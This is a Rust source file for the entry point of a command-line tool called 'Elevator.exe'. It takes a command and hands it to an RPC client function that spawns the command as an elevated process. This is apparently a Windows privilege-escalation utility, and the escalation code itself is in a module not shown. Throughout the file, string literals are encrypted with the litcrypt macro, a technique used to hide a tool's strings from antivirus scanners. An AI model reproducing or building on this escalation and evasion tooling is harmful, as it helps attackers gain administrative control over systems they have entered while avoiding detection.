#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use std::env;

fn main() 
{
   start();
}

fn start() {

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 || args[1] == "-h" || args[1] == "--help"
    {
        print_help();
        return;
    } 

    let cmd = args[1].to_owned();
    let mut new_console = false;

    if args.len() > 2 && (args[2] == "-n" || args[2] == lc!("--new-console"))
    {
        new_console = true;
    }

    if rpcclient::spawn_elevated_process(cmd, new_console)
    {
        println!("{}", lc!("[!] Elevated process spawned!"));
    }

}

pub fn print_help() 
{
    let help = lc!("
USAGE:
    Elevator.exe [OPTIONS] <COMMAND>

ARGS:
    <COMMAND>                   Command line to run.

OPTIONS:
    -h, --help                  Print help information.
    -n, --new-console           Set CREATE_NEW_CONSOLE flag for the new process.
");

    println!("{}", help);
}